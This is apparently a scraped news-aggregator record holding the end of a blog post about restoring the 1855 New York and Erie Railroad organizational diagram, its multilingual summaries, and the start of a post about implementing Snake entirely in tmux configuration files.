broadened my search to those with more stylistic italics like Magister, Libre Bodoni, and Bodoni Moda, but none felt quite right.\nThen I found Geographica and its italic style was nearly perfect. According to its description, it was “inspired by the neat, hand-lettered text on the 1700s maps of Thomas Jefferys, Geographer to King George III” and had a style nearly identical to the text in the legend. Its x-height was taller than the original and was a little more spacious but these were fine compromises for my needs. As a bonus, it had a style of superscript with dots underneath for the few spots in the lower right portion of the table that needed them.\nThe headings for Explanations and Symbols were set in Scotch Modern, which was also used for station labels along the the five branches of the main diagram. Explanations was stretched and spaced out a bit.\nFor the geometric sans serif text used for the symbol labels and in the table, I considered using DIN or Barlow again and used the former for the table title, but their condensed styles were too narrow and their regular styles were too wide for text in the table. At smaller sizes, I couldn’t find a weight that worked well. The legend—as well as many of the labels in the main diagram—also included many superscript letters with a dot underneath—a style I fell in love with over the course of the project. The following section has more detail about reproducing them and how they’re used in the personnel labels. I found that Interstate set in bold worked great for text at tiny sizes, wasn’t too wide or narrow, and the superscript size matched the original nicely.\nOnce again, Geographic was a great fit for the old style numbers for the number of personnel in each class and at each station.\n\n    Recreated legend\n\nLabels\n\nThe main diagram contained three types of labels: personnel, stations, and the distances between those stations. These labels are the heart of what gives the diagram its vintage identity when exploring up close.\n\n    Closeup of various labels at the Dunkirk station\n\nPersonnel labels were by far the most prevalent and written in uppercase with varying methods of abbreviating using superscript. Many also wound around groups of personnel, which added to the organic tree-like feel of the diagram. Like with the labels in the legend table, I used Interstate for each one—drawing the curves for the text to follow as close as possible to the original. Recreating the dots below the superscript letters proved to be more troublesome than I thought. I hoped I could use the dot diacritic but Interstate did not support it. I also tried using extreme negative tracking but could never get the dots to line up perfectly under their corresponding letters. Ultimately, I settled on using two layers for each label that required dots—one with the text and another just for dots—both aligned to the same curve.\n\n    Screenshot showing layers of the Susquhanna Division label flowing along a curve in Illustrator\n\n    Unusual labels with superscript characters and dots under them\n\nThis technique resulted in more tedious work but allowed me the flexibility to position them just the way I wanted by using spaces and tracking setting, especially when just one dot was occasionally used for two letters. Superscript letters were used more liberally in some areas than others, resulting in some very interesting-looking labels.\nThe labels for leadership positions (treasurer, land agent, auditor, etc.) and the different divisions emanating from the general superintendent role in the center were also set in Interstate. Some groups of personnel included numbers after the text that appeared to be in a different style and I started by setting my numbers in Bodoni Moda to match but they felt disjointed so I kept them in Interstate to feel more cohesive.\nThe label for the board of directors unlike all the others, which was appropriate because all the visual elements for them were unique. It sat in the curved space between the arrows connecting the 16 circles with inset stars to the president, alternating between or two letters between most arrows. It was also set in Bodoni Moda but with the same shading treatment as the word Diagram from the title.\n\n    Screenshot showing layers of the board of directors label in Illustrator\n\nAs previously mentioned, Scotch Modern was used for station names with varying degrees of stretching depending on space restrictions. Whenever space allowed, I tried to keep them the same style for consistency. Names of smaller stations are written in title case rather than uppercase. Between each pair of stations was a small number representing the miles between them. They varied in style and size more than I expected and except for a few tight areas, I made sure they were styled consistently with Glegoo.\n\n    Closeup of station and distance labels\n\nCredits\n\nAt the bottom of the diagram nestled between the board of directors, title, and legend were two sets of stylized credits for the diagram’s creators: Daniel McCallum, the railroad’s general superintendent and George Holt Henshaw, a civil engineer and draftsman.\n\n    Original credits\n\nThey each follow the same typographical usage:\n\n    Activity (Designed or Compiled and Drawn) set in Interstate bold\n    by set in Geographica regular\n    Job title set in Glegoo\n\nI also took the liberty of adding my own credit in the available space at the lower left of the title as a stamp of my authorship in restoring and recreating the diagram. This area was missing in the scan on the Library of Congress’ site and without any indication that something was there originally, I felt that including my credit was acceptable.\n\n    Recreated credits including my own (right)\n\nIconography\n\nSprinkled along the straight lines representing the five major lines are four symbols representing the services or amenities at each station: a locomotive for machine shops, tools for repair shops, eating utensils for eateries or saloons, and a telegraph pole for telegraph capabilities.\n\n    Original symbols\n\nAs I worked my way through the diagram, I noticed that the locomotives were similar to each other but no two were the same. Six were drawn in total: one in the legend, which was the most detailed and five rougher versions at major stations or termina in the diagram. My naïve idea of tracing one of them as an exact copy was significantly underwhelming. Attempts to automatically convert them to vector drawings in Illustrator were even more so. I searched through The Noun Project and Adobe Stock for better versions—trying to find a balance between hand-drawn and high-fidelity that would work at small sizes. After much trial and error, I settled on one from a set of old train icons that resembled the detailed one from the legend. As a bonus, a dark version was also available for the dark style of posters I planned to make.\n\n    Original locomotive symbols\n\n    Tests for new locomotive symbols\n\nThe symbols for saloons and repair shops were very rough due to their small size and I wanted to match the more polished nature of the locomotive symbol so I exercised some creative freedom and used icons from Adobe Stock with some modifications. The symbol for repair shops was a little cryptic, with what looks like a wrench and some other straight tool. I later learned as part of my extended research that it was intended to be a hammer (Wrege, et al., 2005). I chose a more standard-looking hammer and wrench. The most straightforward of these to recreate was the telegraph pole as it was a simple arrangement of lines with a dot on the top.\n\n    Original and new icons for saloons (top left), repair shops (top right), and telegraph stations (bottom)\n\nDiagram\n\nThe main diagram was created in several stages, starting at the bottom with the board of directors, working my way up through leadership in the center, then drawing each main branch, starting on the left side and moving clockwise to the right. I worked this way so I had an easier time keeping track of what I had done but this had the unexpected benefit of easing me into the more complicated areas in the middle instead of starting with them right away.\n\nLeadership\n\n    “Burst” surrounding the board of directors comprising 1,582 hand drawn lines in progress (top) and final (bottom)\n\nThe first part I drew was what I referred to as the “burst,” or the lines that resembled rays of light surrounding the board of directors. In a futile attempt to create them efficiently, I tried to create evenly-spaced lines emanating from a central point and clipping paths for the jagged edges and cutouts but the results started to look too polished and the charm was lost. Instead, I bit the bullet and drew each of the 1,582 lines by hand to ensure an exact replica.\n\n    Comparison of the circles and arrows for the board of directors. Red shapes are spaced evenly and blue shapes are manually adjusted to match the original.\n\nThe stars representing the board of directors and arrows connecting them to the president looked like they were evenly spaced distributed around him but they weren’t, so after starting with them as such, I manually shifted them to align them with the original. I also created a custom lined pattern for the shading in the circles that world be used for all others. This pattern is a simple set of tightly-spaced lines but always at a 45 degree angle.\n\n    The two areas of leadership\n\nThe larger circles for the president and general superintendent were the only two with layered stars. The 6 circles connected to the president representing others in charge of business affairs and 18 representing smaller divisions had decorative ribbons and labels on them. Again, these looked evenly-spaced but needed a manual touch to align them properly.\n\nPersonnel\n\nI developed a sequence of steps for drawing each branch so I could keep track of what I had done as I stopped and started over the weeks needed to complete them. Using the Western line as an example, these were the steps:\n\n    Portion of the “trunks” for the Western branch\n\nFirst, trace the “trunks,” which were the winding and straight double lines connected to the division head. The winding trunks comprised thin and thick lines drawn with the paintbrush as closely as possible to the original with minimal smoothing, giving them a bit of dimension. The straight ones were double lines representing the five main train lines and the distances between stations.\n\n    Portion of the dots for the Western branch\n\nWith the trunks in place, I added the small rectangles for stations (when necessary) and the many circles for personnel, which I referred to simply as “dots.” There were two main sizes is these dots—the larger, indicating supervisors, and smaller for the lowest level of personnel. To ensure I didn’t miss any, I always placed the dots in a clockwise order. A subset of the dots had small protrusions pointing in various directions indicating flagmen or switchmen.\n\n    Portion of curved branches for the Western branch\n\nNext were the thin curved branches connecting all the dots and the trunk. I enjoyed this the most even though it was the most tedious. With Illustrator’s fidelity option turned up for the paintbrush tool, I was able to draw the best curves without worrying about precision. This was a lot faster than drawing with the pen tool and messing with bezier curves manually. Thicker versions of these branches were used for areas with many dots.\n\n    Extreme closeup of the branches for the clerks reporting to the auditor before polishing (red) and after (blue) overlaid on top of each other to highlight the subtle differences\n\nHowever, the positions of the endpoints needed polishing to line up perfectly, so after I drew them, I made a second pass to move each endpoint so it intersected precisely with a dot or connecting branch to ensure a smooth look. Again, I methodically drew each branch in a clockwise order and adjusted their endpoints on a second pass in the same order. These branches took the longest to create compared to all other parts of the restoration but the result was worth the effort.\n\n    Portion of labels for the Western branch\n\nFinally, I placed the labels and iconography, starting with station names along the straight trunks, followed by the distances between them, and ending with their services/amenities. Nearly every label for personnel groups was set along a curved line and no two were the same so each curve was manually adjusted to be as close to the original as possible. The text size varied a little in the original but I maintained a consistent size in my version consistently except for a few of the larger groups which warranted larger labels. I also took the liberty of correcting a few typos and personnel counts but the original had very few errors.\nThis process was completed for each major division. Below is a set of images showing the order in which each part was completed. Drag the slider to step through the various stages.\n\n        /* Making of collage */\n        .making { margin: 0 auto 1rem; text-align: center; }\n        #making-image { border: 1px solid #ddd; display: block; height: 80vh; margin: 0 auto 1rem; }\n\n        #making-slider {\n            -webkit-appearance: none;\n            background: var(--bg);\n            display: block;\n            margin: 0 auto 1em;\n            width: 50%;\n        }\n\n        #making-slider::-moz-range-thumb { background: #000; border-radius: 100%; height: 1rem; width: 1rem; }\n        #making-slider::-webkit-slider-thumb { -webkit-appearance: none; background: #000; border-radius: 100%; height: 1rem; margin-top: -10px; width: 1rem; }\n\n        #making-slider::-moz-range-track { background: rgba(0, 0, 0, 0.5); cursor: pointer; height: 2px; width: 100%; }\n        #making-slider::-webkit-slider-runnable-track { background: rgba(0, 0, 0, 0.5); cursor: pointer; height: 2px; width: 100%; }\n\n        $(document).on(\"input change\", \"#making-slider\", function() {\n            var v = $(this).val();\n            $(\"#making-image\").prop(\"src\", \"/images/blog/nyer-steps-\" + v + \".jpg\");\n        });\n\n        Drag slider to see the progress from start to finish.\n\nIn hindsight, creating the title and legend first, followed by the leadership areas was a wise choice because I was able to iron out many of the nuances and workflows before embarking on the long repetitive task of drawing all the branches. Keeping my file well organized and approaching it methodically meant I rarely had to redo anything and making mass adjustments was relatively simple.\n\nAt this point, the diagram was complete but I wasn’t.\n\nColors\n\nAs with most my projects, I wanted to add my own spin on it and for this one, I chose to create new colorized versions. While recreating the diagram, I periodically experimented with different palettes on a small subset of representative shapes, starting with generic palettes I found on Pinterest inspired by the victorian era and a vintage map.\n\n    First few color schemes based on generic palettes from Pinterest (top and middle) and the proposed route map from 1834 (bottom)\n\nThese were fine but nothing special. They illustrated a key change I wanted to make, which was replacing the thin lines shading each circle with flat colors. I loved the shading lines from the original but wanted to make variations that were a more modern while still paying homage to the original. In an effort to give the colors more meaning, I discovered a map of the proposed route of the New York and Erie Railroad from 1834. This beautiful map of southern New York counties had a great set of colors but when applied to the small sample, they didn’t have enough contrast for the wide variety of elements I wanted to color.\n\n    Advertisements for Erie Railway from 1874 in original colors (top) and restored (bottom)\n\nAfter some more digging through railway ephemera, I found a wonderful advertisement for the Erie Railway from 1874, promoting the stops along its route by way of named locomotives and train cars. The Amon Carter Museum of American Art has an original and I found a restored version on Etsy. The second I saw the latter, I knew it would be the perfect source of a palette. The bold red in the title and on the equipment worked so well with the bright yellow and subdued green for the landscape. My initial pass at a color palette used a few too many colors but I liked the general direction.\n\n    Closeup of branches and leaves on the light poster\n\nWhile experimenting with colors, I settled on the idea of using them to differentiate between structure and people. Most importantly, since the diagram had such a strong resemblance of a tree, I wanted to use shades of green for the people as leaves. A different shade of green was used for supervisors so their presence is more noticeable. The winding branches connecting them were colored brown. The tiny protrusions for flagmen and switchmen are a bright yellow as a nod to their job of keeping everyone safe and running smoothly along the tracks. Straight lines representing the physical lines and stations along them use shades of bright red. The colors of top leadership circle vary from shades of green to highlight their different roles: light blue for the primary leadership roles of president and general superintendent to which many others report and bright red for the board of directors that govern the activities.\n\n    Closeup of symbols on the dark poster\n\nColors from the Erie Railroad advertisement were also used for the other symbols representing station services and amenities. As an added bonus, I also created dark versions of the diagram—one in black and white and another in full color. The addition of these rounded out the set of posters nicely and I’m thrilled with the final results. Seeing them in person and exploring all the details is quite fun.\n\n    Final posters in light and dark themes with closeups\n\nOrder posters\n\nMissing piece\n\n    Closeup of the missing part at the top center\n\nKeen-eyed readers may have noticed that my recreation differs from the original in a small but important way: the missing piece at the top center. The missing piece cut off the farthest part of the Susquehanna line and a few of the foremen and laborer dots from the Delaware line. In all my research this small part is only referenced once as a note on the Library of Congress’ site as “missing sections along the margins.”\nThe lack of information nagged at me throughout the project and I spent weeks combing through maps, old books, and library records hoping to find a shred of information about what was once depicted there. I sent dozens of emails to anyone who might have had any information about it. I was only able to piece together part part of it. For the rest, I made educated guesses, calculated estimates, and exercised a little creative license.\nFirst, I listed the few things that had to be true given what was visible around it:\n\n    After Crosbyville, another station was 4.92 miles away.\n    A station past Crosbyville had a relatively long name ending in “LLE.”\n    There wasn’t enough room to have more than one or two stations beyond Crosbyville.\n\nMy first stop was Google maps to see what was 4.92 miles away from Crosbyville in New York by using its measure feature and drawing along existing rail lines. Canisteo was the only town and according to their Wikipedia page, they were indeed part of the Erie Railroad. Since Henshaw drew the stations at mostly accurate distances from each other, placing a station at 4.92 miles away from Crosbyville (now Adrian) left room for one more station to be named next to the “LLE” that was above it.\n\n    Screenshots from Google maps showing distance between Adrian (formerly Crosbyville) and Canisteo (top) as well as between Canisteo and Hornell (bottom)\n\nFollowing the train line on Google Maps, the next town was Hornell, which was an appropriate distance away to line up with the visible “LLE” text but “Hornell” was a much shorter name and didn’t fit. Digging into the history of Hornell, I found a page on the Allegany County Historical Society’s site titled “Erie Railroad” and a line of text confirming that the station used to be named Hornellsville (emphasis mine):\n\n    The Susquehanna Division’s portion of that mileage began at SR Tower, just west of Susquehanna station and ended just west of the Hornell station, no longer Hornellsville…\n\nThe City of Hornell’s Wikipedia page also confirmed that it was surrounded by the Town of Hornellsville so that answered the question of the station ending in “LLE.” The next challenge was to determine the exact distance of the station from Canisteo. The first line of the diagram’s explanation mentions that it was “compiled from the September Reports” and as luck would have it, I found a publication on Google Books titled, Reports of the President and Superintendent of the New York and Erie Railroad to the Stockholders for the Year Ending September 30, 1855, which later research confirmed was the one mentioned. It contained, among other operational and financial details, the distances between stations in table Z on page 180, which listed Hornellsville as 4.21 miles from Canisteo.\n\n    Page 180 from an 1855 report with distance between Hornellsville and Canisteo highlighted\n\nHornellsville is also listed two more times on the diagram near the division heads for the Western and Buffalo lines. Both of those indicated that it had a telegraph station, saloon, and a repair shop. However, they both showed different amounts of employees—the one on the Western division with significantly more.\n\n    Close up of the other two  places Hornellsville is mentioned in the diagram\n\nGiven the number of services available at Hornellsville and the fact that they were represented as rectangles in the other area of the diagram, using a rectangle was a safe assumption. Half a small circle is visible at the bottom of the missing area, which is just about the same distance away from where a station and its agent would be for Canisteo when compared to others. Therefore, I added a rectangle for Canisteo, a larger circle, and the other half of the smaller one. I was pleased with my detective work.\n\n    Hornellsville and Canisteo stations filling in missing piece\n\nHowever, this was the end of what I could definitively determine based on existing information. I could not find any information on the number of employees at each station beyond a casual mention of a foreman, division inspectors, subordinates and a station agent in the 1855 report (see pages 38–43). This was useful information but not as reliable as a roster or a larger report about personnel.\nBelow are my other attempts to track down this information:\nI found a restored version of the diagram for sale on Etsy and reached out to the seller who told me that he consulted period maps and conducted his own research, later adding that he used the help of AI to reconstruct it.\nI contacted the Hornell Public Library asking for any information about Erie Railroad employees around 1855 and they quickly responded saying that while they had some information on the history of railroads, I should contact the Hornell Erie Depot Museum. At first, I considered myself extremely fortunate that there just happened to be a museum dedicated to the Erie Railroad in the very town for which I needed information. Unfortunately, despite repeated emails, phone calls, voicemails, and outreach on their Facebook page, I could not get in touch with a single person either at the museum or city hall, whose phone number was the one associated with the museum. I was surprised that ended up as a dead end because I thought if anyone would know anything about my question, they would. I plan to continue trying to get in touch with them.\nI broadened my search to the state level and chatted with a librarian from the New York Public Library (NYPL) who recommended I contact their Irma and Paul Milstein Division, which specializes in United States history, local history and genealogy. After doing so, they found four reports spanning 1833 to 1869 covering details about the railroad’s operations. They weren’t available remotely through their site but most were online at HathiTrust. After sifting through hundreds of pages, I couldn’t find any new information. They also provided links to Archive Grid for archival collections in other institutions, New York State Archives (NYSA), and the Library of Congress for the bulk of the New York and Erie Railroad materials. Additionally, they found the same McKinsey article by Rosenthal that I referenced at the beginning of this post and specifically called out the footnote in the aside referencing the article by Wrege and Sorbo. Finally, they recommended contacting the National Canal Museum (NCM) and the Railway and Locomotive Historical Society (RLHS). They were truly a font of knowledge and gave me a lot of avenues to explore. I’m very grateful for their assistance.\nBetween sending my request to the NYPL and receiving their helpful response, I contacted the Steuben Historical Society (Hornell is in Steuben County) and piqued the interest of their director but he said they didn’t have “such a thing in any comprehensive form.” He did say he would check with sources he knew about local history and would get back to me. I haven’t heard back at the time of this writing.\nHeeding the advice of the NYPL, I contacted the NYSA, RLHS, and NCM. The NYSA referred me to a search on the New York State Library’s catalog for reports and maps relating to the railroad. The membership secretary at RLHS commented that I was having a hard time because “no large railroads kept central records of all their workers.” I received no response from NCM. The New York State Library stated that they didn’t have much information around railroad history and suggested I contact the Williamsburg Depot, the Railroad Museum of the Niagara Frontier, or their Manuscripts and Special Collections Unit but didn’t sound hopeful that they would produce helpful results.\nThe mention of Wrege and Sorbo’s 2005 article in Rosenthal’s footnote piqued my interest because it sounded like a fruitful avenue for finding information about the missing piece but also about the general history of the diagram and I was right. It reshaped my entire view of it but more on that later. With my interest elevated, I sought about finding their original article, which presented its own challenges. The NYPL mentioned that it was published in the 24th volume of the Canal History and Technology Proceedings. In trying to find that specific volume, I found records for nearly all other volumes on various sites but never the 24th. None of the the records I found for the other volumes were available for viewing online but at least there were records.\nThe lack of a response from the NCM is especially unfortunate because in a page on their site describing the annual symposium for which the proceedings were published, they stated,\n\n    All of the Symposium papers are available in PDF form from the Archives of the National Canal Museum/Delaware & Lehigh National Heritage Corridor.  Limited numbers of some complete volumes of the Proceedings are also available at $5 per copy by ordering through www.delawareandlehigh.org.\n\nHowever, there was no record of the papers for purchase on the site mentioned—another dead end.\nFeeling rather defeated, I started writing this blog post and after a few pages, decided to try once again to find the now-fabled 24th volume and had another stroke of luck when I found a single record buried on the Penn State Universities Libraries site labeled as, Canal history and technology proceedings: volume XXIV March 19, 2005 / editor, Lance E. Metz. To say I was elated would be an understatement. This is the only record of that volume I found. After I chatted with one of their librarians about getting a copy of the article and they said I could request it as an interlibrary loan through my local library. I quickly did so and received a 38-page PDF of it a few days later after paying a minor $15 fee. I also was able to get the original book from which the article was scanned to see if there was any improvement in the image quality and after another few days and an additional $15 fee, I confirmed that they weren’t any different in the book.\n\n    Pages from A Bridge Builder Changes a Railroad: The Story of Daniel Craig McCallum\n\nAfter becoming somewhat obsessed with this diagram, this article was a gold mine. The depth of research Wrege and Sorbo did to learn about its history was a joy to read. Ironically, there’s no mention of the missing part of the scan on the Library of Congress’ site, which was a minor disappointment, but the knowledge I gained more than made up for that. Much of the introduction of this blog post was informed by its contents. The article was published in 2005 and therefore still under copyright so it cannot be freely posted here but I will send it to anyone interested—just contact me.\nSince I could find no other mention of the missing piece, I decided to start making educated guesses, estimates, and exercised some creative license to fill in the last piece of the puzzle: the employees. Circling back to square one, I started with the numbers in the legend, which stated that for the Susquehanna line, there were the following employees at the stations:\n\n    21 agents\n    15 clerks\n    55 warehousemen, watchmen, porters, etc.\n    22 switchmen and flagmen\n    2 train dispatchers\n    2 engine dispatchers\n    35 engine wipers\n\n    Original legend with Susquehanna personnel at stations highlighted\n\nIn counting the circles along the Susquehanna line, I found:\n\n    20 larger circles, probably indicating agents\n    1 labeled clerks connected to the general superintendent\n    No warehousemen, watchmen, or porters labeled\n    22 labeled switchmen and flagmen\n    No labeled train dispatchers\n    1 labeled engine dispatcher\n    26 labeled engine wipers\n    67 unlabeled small dots\n\nThe only number that lined up with the legend was for the switchmen and flagmen. However, this made some sense considering the first sentence of the explanation above the table states (emphasis mine):\n\n    This Diagram compiled from the September Reports, indicates about the average number of employeés of each class engaged in the Operating Department of the Road…\n\nEven the September report which I found earlier doesn’t have any definite numbers for the employees along each line. So if the numbers shown were averages and no other source had information, I made some estimates:\nCanisteo appeared to be a smaller town than Hornell but larger than Crosbyville so I decided to make its station a rectangle. Most stations represented as rectangles had a larger dot representing a station agent and a smaller one so created the same for Canisteo.\nHornellsville was represented two other times on the diagram—once for the Western line and again for the Buffalo line. This made sense, considering Hornellsville was a fork to two destinations: Dunkirk and Buffalo according to an 1855 map on the Library of Congress. The Western line showed an engineer dispatcher with 10 wipers reporting to them and a large circle representing a supervisor with 19 employees reporting to them—4 of which were flagmen or switchmen. The Buffalo line had fewer employees with two unlabeled small circles and one switchman of flagman because it was only a projection (Wrege, et al., 2005). Looking at all the other representations of engineer dispatchers throughout the diagram, they had an average of nine wipers reporting to them so I put one engineer dispatcher and nine wipers at Hornellsville on the Susquehanna line. A simple average of the four switchmen or flagmen on the Western line and the one on the Buffalo line produced three so I added three switchmen or flagmen to it as well. Finally, I added three unlabeled dots for an extra few personnel. Labels and connecting branches were drawn in the style of the rest of the diagram.\n\n    My reconstructed version of the missing piece based on estimations and best guesses.\n\nThis method of determining employees was rough but I didn’t want to leave the spot empty or partially filled so this process felt appropriate given the limited information available. Port Jervis and Susquehanna are the other two examples of the same place shown in the diagram more than once with different personnel at each so this display was not without precedent.\nThe story almost ended here…\nIn fact, I wrote most of this blog post assuming I had chased down all the leads and wasn’t going to get any more information. That is, until I thought to email Caitlin Rosenthal—the author of the McKinsey which sparked this entire endeavour. In her article, she mentioned that she located a second copy at St. Lawrence University in upstate New York. In all my research, I only came across variations of the scan at the Library of Congress. Even the file page on Wikipedia for the diagram and all pages referencing it don’t include a mention of another copy. I asked her if she remembered anything about it and while she didn’t, but she did point me to a listing of maps in the special collections department at the university’s Owen D. Young Library where the diagram was listed (fourth line from the bottom of the second page). That prompted me to leave voicemails and send emails to the team there asking if they knew about it and if they could send me a picture.\nTo my surprise, they sent me back two pictures of their copy—beautifully intact and one of them contained the very piece I spent weeks trying to track down.\n\n    Top, bottom, and closeup of the second copy of McCallum’s diagram held at the special collections department of the St. Lawrence University’s Owen D. Young Library\n\nTo say I was excited would have been a great understatement. I was over-the-moon thrilled that I tracked down not only a second original copy, but that it also had the missing piece and I was able to get pictures of it so I could complete my restored diagram. To my knowledge, these pictures are the first to be shared online of this second copy. I acknowledge that could have saved myself a lot of work by emailing Caitlin in the first place but I wouldn’t have learned as much as I did or developed an appreciation for the diagram and its history if I hadn’t tracked down the original article and done all the extra research. The journey was the best part of this project.\n\n    My restored final version of the missing piece\n\nI was also pleasantly surprised to see that my reconstruction wasn’t that far off base from the original. I correctly figured out the station names, distance between them, types of stations, and the fact that Hornellsville had an engine dispatcher with the nine wipers.\n\nFinal thoughts\n\nI adored working on this project. It was small, relaxing, surprisingly interesting, and had an incredibly satisfying ending. The posters only took a few weeks to create and I explored a lot of great typography in the process. The deep dive into its history was unexpectedly exhilarating. I spent more than twice the amount of time researching it than creating the posters and I learned more than I ever imagined. Finally filling in the missing piece felt like something out of a movie. Writing this blog post was a joy because I loved to piecing together all my research to share with others.\nI appreciate my friends and family enduring my rambling about my latest discoveries. My sincerest thanks goes out to the librarians who helped me with research and pointed me in new directions I would have otherwise never discovered. Librarians are truly the unsung heroes of many research projects.\nMy hope is that by publishing this blog post and offering my posters for sale is that I introduce this fascinating little slice of American history to others and fill in a very minor but long-standing gap for others doing research in the future.\n\nSee the final posters\n\nReferences\n\n    Chandler Jr., A. (1977). The Visible Hand: The Managerial Revolution in American Business.\n    Wrege, C., & Sorbo Jr., G. (2005). A Bridge Builder Changes a Railroad: The Story of Daniel Craig McCallum. Canal History and Technology Proceedings, XXIV, 183–218.\n\n« Back to blog",
    "summary": {
      "en": "Nicholas Rougeux's article discusses his recreation of the historic organizational diagram of the New York and Erie Railroad, originally crafted in 1855 by Daniel McCallum. This diagram, once overlooked, is notable for its intricate design and historical significance. McCallum created it to enhance accountability and communication within the railroad, but his strict management style led to employee resentment and even the first strike of railroad engineers in America.\n\nRougeux explains that he started with a single image from the Library of Congress and delved into research to understand the diagram's background. He found that its tree-like structure symbolized the hierarchy of the railroad's operations and employees. Despite initial theories linking the design to Masonic symbols or local flora, Rougeux believes the tree shape was simply effective for visualizing organizational structure.\n\nThroughout the project, Rougeux focused on typography, painstakingly matching modern fonts to the original styles used in the diagram. He also recreated the legend and various labels, ensuring they maintained the vintage identity of the original.\n\nTo add a personal touch, Rougeux experimented with color schemes, ultimately deciding to use shades of green for personnel to reflect their resemblance to leaves, while using browns and reds for the structure of the diagram.\n\nA significant part of his journey involved tracking down a second original copy of the diagram at St. Lawrence University, which contained a missing section he had previously reconstructed based on estimates. This discovery completed his restoration project.\n\nRougeux expresses his enjoyment of the process, emphasizing the satisfaction gained from both the creative and research aspects. He hopes to share this piece of American history through his recreated posters and inspire others to explore its background.",
      "ko": "니콜라스 루주의 기사는 1855년 다니엘 맥컬럼이 제작한 뉴욕과 에리 철도의 역사적인 조직도를 재현한 과정을 다룹니다. 이 도표는 한때 간과되었지만, 복잡한 디자인과 역사적 중요성으로 주목받고 있습니다. 맥컬럼은 철도 내에서 책임감과 소통을 강화하기 위해 이 도표를 만들었지만, 그의 엄격한 관리 스타일은 직원들의 반감을 불러일으켰고, 결국 미국 철도 엔지니어들의 첫 파업으로 이어졌습니다.\n\n루주는 의회 도서관에서 단 하나의 이미지를 시작으로 이 도표의 배경을 이해하기 위한 연구에 들어갔습니다. 그는 이 도표의 나무 모양 구조가 철도의 운영과 직원들 간의 계층을 상징한다고 발견했습니다. 초기 이론들은 이 디자인이 프리메이슨 기호나 지역 식물과 관련이 있다고 주장했지만, 루주는 나무 형태가 조직 구조를 시각적으로 표현하는 데 효과적이었다고 믿고 있습니다.\n\n프로젝트 전반에 걸쳐 루주는 타이포그래피에 집중하며, 현대 글꼴을 원래 도표에서 사용된 스타일과 일치시키기 위해 많은 노력을 기울였습니다. 그는 또한 전설과 다양한 레이블을 재현하여 원본의 빈티지 정체성을 유지했습니다.\n\n개인적인 터치를 더하기 위해 루주는 색상 조합을 실험했으며, 최종적으로 인사 관련 부분에는 잎사귀를 연상시키는 녹색 음영을 사용하고, 도표의 구조에는 갈색과 빨간색을 사용하기로 결정했습니다.\n\n그의 여정에서 중요한 부분은 세인트 로렌스 대학교에서 두 번째 원본 도표를 찾는 것이었습니다. 이 도표에는 그가 이전에 추정에 기반해 재구성했던 누락된 부분이 포함되어 있었습니다. 이 발견은 그의 복원 프로젝트를 완성하는 데 큰 도움이 되었습니다.\n\n루주는 이 과정이 즐거웠다고 표현하며, 창의적인 작업과 연구에서 얻은 만족감을 강조했습니다. 그는 자신의 재현 포스터를 통해 이 미국 역사의 한 조각을 공유하고, 다른 사람들도 그 배경을 탐구하도록 영감을 주기를 희망하고 있습니다.",
      "ja": "ニコラス・ルージュは、1855年にダニエル・マッカラムによって作成されたニューヨーク・エリー鉄道の歴史的な組織図の再現についての記事を発表しました。この図は、かつては注目されていませんでしたが、その複雑なデザインと歴史的な重要性で知られています。マッカラムは、鉄道内の責任感とコミュニケーションを向上させるためにこの図を作成しましたが、彼の厳格な管理スタイルは従業員の反感を招き、アメリカで初めての鉄道技師のストライキを引き起こしました。\n\nルージュは、アメリカ議会図書館から得た一枚の画像を基に、図の背景を理解するための研究を始めました。彼は、この木のような構造が鉄道の運営と従業員の階層を象徴していることを発見しました。デザインがフリーメイソンのシンボルや地元の植物に関連しているという初期の理論があったものの、ルージュは木の形が組織構造を視覚化するのに効果的だったと考えています。\n\nプロジェクトを通じて、ルージュはタイポグラフィに重点を置き、現代のフォントを元のスタイルに合わせる作業に取り組みました。また、伝説やさまざまなラベルを再現し、オリジナルのビンテージなアイデンティティを保つよう努めました。\n\n個人的なタッチを加えるために、ルージュは色の配色を試し、最終的に人員には葉に似た緑色の色合いを使用し、図の構造には茶色や赤色を使うことに決めました。\n\n彼の旅の重要な部分は、セント・ローレンス大学で図の第二のオリジナルコピーを見つけることでした。このコピーには、彼が以前に推測に基づいて再構築した欠落部分が含まれていました。この発見によって、彼の復元プロジェクトは完成しました。\n\nルージュは、このプロセスを楽しんだと述べ、創造的な側面と研究的な側面の両方から得られる満足感を強調しています。彼は、自身が再現したポスターを通じてこのアメリカの歴史を共有し、他の人々にもその背景を探求するよう促したいと考えています。"
    }
  },
  {
    "id": "ab1f20b26e7cf831",
    "title": {
      "en": "Show HN: I implemented Snake in a tmux config file",
      "ko": "tmux로 뱀 게임 구현!",
      "ja": "ターミナルでスネークゲーム！"
    },
    "type": "story",
    "url": "https://willhbr.net/2025/03/20/snakes-in-a-pane/",
    "score": 51,
    "by": "willhbr",
    "time": 1742976440,
    "content": "Snakes in a Pane: Building Snake Entirely Within a tmux Config File\n\n      March 20, 2025\n\n        •\n\n        projects\n\n        tmux\n\n    Honestly I’d stop if I could, but I just get carried away. After making a compiler for tmux, then solving sudoku, then playing video I wasn’t planning on making a game. These things just happen to you. Well maybe not to you, but they happen to me.\n\nUnlike the video player, this isn’t just rendering Snake inside tmux. The entire game—input, game logic, and rendering—is done using tmux config files. You just load tmux with this config, and you’ll have Snake. Check out the code or have a look at me playing it in the video:\n\nThe display works the same as my video player. It uses many tested sessions to create a stack of status lines, each with enough windows to span the width of the screen. The “display” is updated by setting the style of the window to correspond with the window name, and then changing the name to the appropriate colour. In this case I’m only using two colours, whereas in the video I was using the full range of ANSI colours.\n\nThere’s a big difference in how I initialise the screen, with the video player I used a recursive script to start all the nested tmux sessions, and since I knew the width upfront (it has to be static as the video needs to be scaled) I just generated the right number of new-window calls. Since I wanted this to be entirely tmux, I worked out a way of doing this without a shell script.\n\nInstead of recursively calling a shell script to fill the height, I set the default-command (run whenever you create a new window) to be:\n\nTMUX= tmux if-shell -F \"#{e|>:#{window_height},1}\" new-session\n\nEvery time a new session is created, if the height of the window in that session is more than one row, we’ll create a new session. Once we’ve filled the height, the command will exit without creating another session.\n\nTo fill each session with windows, I added a hook for session-created:\n\nset-hook -g session-created {\n  run -C \"set -g @width '#{e|/:#{window_width},2}'\"\n  run -d 1 -bC 'source-file create_windows.conf'\n}\n\nAfter a short delay, this will load create_windows.conf:\n\nif -F '#{e|<:#{session_windows},#{@width}}' {\n  new-window -b 'exit'\n  select-window -t '{last}'\n  source-file create_windows.conf\n} {\n  if -F '#{e|==:#{window_height},1}' {\n    source-file -t '$0' init.conf\n  }\n}\n\nThis script checks if there’s enough room for another window, and if so it creates one and loads itself again. Once we’ve filled the width, I check if this is the final window to be created, and if so I load the main 